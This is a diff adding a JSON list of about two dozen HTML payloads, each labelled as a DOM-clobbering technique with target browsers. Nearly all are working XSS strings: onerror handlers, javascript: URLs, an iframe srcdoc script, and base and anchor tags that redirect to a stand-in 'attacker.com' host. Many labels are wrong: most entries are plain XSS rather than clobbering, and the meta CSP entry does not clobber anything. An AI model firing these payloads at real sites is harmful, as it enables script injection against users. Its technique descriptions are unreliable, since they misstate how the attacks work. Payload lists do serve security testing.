@@ -1,0 +1,158 @@
+[
+  {
+    "description": "Basic DOM clobbering - overwrite window variable via anchor name",
+    "code": "<a id=\"location\"><a id=\"location\" name=\"//attacker.com\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "name-attribute"
+  },
+  {
+    "description": "DOM clobbering - overwrite window.frames via iframe name",
+    "code": "<iframe name=\"frames\" src=\"about:blank\"></iframe>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "iframe-name"
+  },
+  {
+    "description": "DOM clobbering - clobber document.all with custom element",
+    "code": "<div id=\"all\"><img src=x onerror=alert(1)></div>",
+    "browsers": ["ie", "edge"],
+    "technique": "document-all"
+  },
+  {
+    "description": "DOM clobbering via form element to override window.form",
+    "code": "<form id=\"config\"><input name=\"url\" value=\"javascript:alert(1)\"></form>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "form-element"
+  },
+  {
+    "description": "DOM clobbering using anchor with href and id to overwrite window.location",
+    "code": "<a id=\"location\" href=\"javascript:alert(1)\">click</a>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "anchor-href"
+  },
+  {
+    "description": "DOM clobbering via img with id to clobber constructor property",
+    "code": "<img id=\"constructor\"><img id=\"constructor\" onerror=alert(1) src=x>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "constructor-clobber"
+  },
+  {
+    "description": "DOM clobbering using nested elements to bypass length check",
+    "code": "<div id=\"a\"><div id=\"b\"><img src=x onerror=alert(1)></div></div>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "nested-clobber"
+  },
+  {
+    "description": "DOM clobbering via span element with id to override prototype",
+    "code": "<span id=\"__proto__\"><span id=\"__proto__\"><img src=x onerror=alert(1)></span></span>",
+    "browsers": ["chrome", "firefox"],
+    "technique": "proto-clobber"
+  },
+  {
+    "description": "DOM clobbering using element name to override document.scripts",
+    "code": "<script name=\"scripts\"></script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "scripts-clobber"
+  },
+  {
+    "description": "DOM clobbering via body element ID for document.body manipulation",
+    "code": "<body id=\"body\"><img src=x onerror=alert(1)>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "body-clobber"
+  },
+  {
+    "description": "DOM clobbering using input element to clobber event handlers",
+    "code": "<input id=\"onclick\" value=\"alert(1)\" type=\"button\" onclick=\"eval(this.value)\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "event-clobber"
+  },
+  {
+    "description": "DOM clobbering via meta element with name to override CSP",
+    "code": "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "meta-clobber"
+  },
+  {
+    "description": "DOM clobbering using select element to clobber window.select",
+    "code": "<select id=\"select\"><option value=\"alert(1)\">XSS</option></select>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "select-clobber"
+  },
+  {
+    "description": "DOM clobbering via textarea element to override value",
+    "code": "<textarea id=\"value\">alert(1)</textarea>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "textarea-clobber"
+  },
+  {
+    "description": "DOM clobbering using object element to clobber window.object",
+    "code": "<object id=\"object\" data=\"javascript:alert(1)\"></object>",
+    "browsers": ["ie", "edge"],
+    "technique": "object-clobber"
+  },
+  {
+    "description": "DOM clobbering via embed element with name",
+    "code": "<embed id=\"embed\" src=\"javascript:alert(1)\">",
+    "browsers": ["ie", "edge"],
+    "technique": "embed-clobber"
+  },
+  {
+    "description": "DOM clobbering using label element to override for attribute",
+    "code": "<label for=\"target\"><img src=x onerror=alert(1)></label>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "label-for-clobber"
+  },
+  {
+    "description": "DOM clobbering via iframe with srcdoc to inject script",
+    "code": "<iframe id=\"frame\" srcdoc=\"<script>alert(1)</script>\"></iframe>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "iframe-srcdoc-clobber"
+  },
+  {
+    "description": "DOM clobbering using div with contenteditable to inject HTML",
+    "code": "<div contenteditable id=\"html\"><img src=x onerror=alert(1)></div>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "contenteditable-clobber"
+  },
+  {
+    "description": "DOM clobbering via link element to override stylesheet",
+    "code": "<link id=\"stylesheet\" href=\"javascript:alert(1)\" rel=\"stylesheet\">",
+    "browsers": ["ie", "edge"],
+    "technique": "link-clobber"
+  },
+  {
+    "description": "DOM clobbering using base element to rewrite URLs",
+    "code": "<base id=\"base\" href=\"//attacker.com/\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "base-clobber"
+  },
+  {
+    "description": "DOM clobbering via template element to hold inactive script",
+    "code": "<template id=\"tpl\"><img src=x onerror=alert(1)></template>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "template-clobber"
+  },
+  {
+    "description": "DOM clobbering using slot element in shadow DOM",
+    "code": "<div id=\"host\"><shadow-root><slot name=\"xss\"></slot></shadow-root><div slot=\"xss\"><img src=x onerror=alert(1)></div></div>",
+    "browsers": ["chrome", "firefox"],
+    "technique": "slot-shadow"
+  },
+  {
+    "description": "DOM clobbering via custom element with is attribute",
+    "code": "<div is=\"xss\" id=\"element\"></div>",
+    "browsers": ["ie", "edge"],
+    "technique": "custom-element"
+  },
+  {
+    "description": "DOM clobbering using table element to override window.table",
+    "code": "<table id=\"table\"><tr><td><img src=x onerror=alert(1)></td></tr></table>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "table-clobber"
+  },
+  {
+    "description": "DOM clobbering via progress element",
+    "code": "<progress id=\"progress\" max=\"1\"><img src=x onerror=alert(1)></progress>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "technique": "progress-clobber"
+  }
+]
